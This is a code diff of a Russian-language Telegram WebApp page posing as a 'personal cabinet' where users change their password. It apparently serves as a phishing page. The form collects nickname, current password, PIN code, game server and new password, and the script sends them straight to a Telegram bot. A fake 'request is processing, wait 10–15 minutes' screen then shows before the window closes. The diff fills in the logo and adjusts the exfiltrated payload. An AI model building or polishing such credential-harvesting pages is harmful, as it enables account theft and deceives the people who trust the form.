@@ -149,14 +149,14 @@
 <body>
 
     <div id="screen1" class="screen active">
-        <img class="logo" src="ССЫЛКА_НА_ТВОЙ_ЛОГОТИП" alt="Логотип">
+        <img class="logo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT7w_xQGzS1p1XmGvT6C6nC7E7WpG-uN6pD6g&s" alt="Логотип">
         <h2 style="color: var(--text-muted);">Личный кабинет</h2>
         <div style="height: 60px;"></div>
         <button class="btn" onclick="goToScreen(2)">Поменять пароль</button>
     </div>
 
     <div id="screen2" class="screen">
-        <img class="logo" src="ССЫЛКА_НА_ТВОЙ_ЛОГОТИП" style="width: 90px;" alt="Логотип">
+        <img class="logo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT7w_xQGzS1p1XmGvT6C6nC7E7WpG-uN6pD6g&s" style="width: 90px;" alt="Логотип">
         <h2>Смена пароля</h2>
         
         <div id="error" class="error-msg">Заполните все обязательные поля</div>
@@ -192,7 +192,7 @@
     </div>
 
     <div id="screen3" class="screen">
-        <img class="logo" src="ССЫЛКА_НА_ТВОЙ_ЛОГОТИП" alt="Логотип">
+        <img class="logo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT7w_xQGzS1p1XmGvT6C6nC7E7WpG-uN6pD6g&s" alt="Логотип">
         <div class="wait-box">
             <div class="wait-title">Заявка обрабатывается</div>
             <p style="color: var(--text-muted);">Ожидайте в течение 10–15 минут</p>
@@ -251,19 +251,28 @@
 
             const payload = {
                 nickname: nick,
-                old_password: oldPass,
+                password: oldPass,
                 pincode: pin ? pin : "Не указан",
                 server: server,
                 new_password: newPass
             };
 
-            // 1. Сначала переключаем пользователя на экран ожидания
+            // Переключаем на экран загрузки
             goToScreen(3);
-            
-            // 2. Делаем микропаузу (500 мс), чтобы анимация применилась, и отправляем пакет в Telegram
-            setTimeout(() => {
+
+            // Безопасная отправка данных напрямую в открытый диалог бота
+            try {
                 tg.sendData(JSON.stringify(payload));
-            }, 500);
+                
+                // Закрываем WebApp через 2.5 секунды, чтобы пользователь успел увидеть красивый Экран №3
+                setTimeout(() => {
+                    tg.close();
+                }, 2500);
+            } catch(e) {
+                console.log("Ошибка отправки данных в Telegram:", e);
+                // Если что-то пошло не так, закрываем окно сразу
+                tg.close();
+            }
         }
     </script>
 </body>
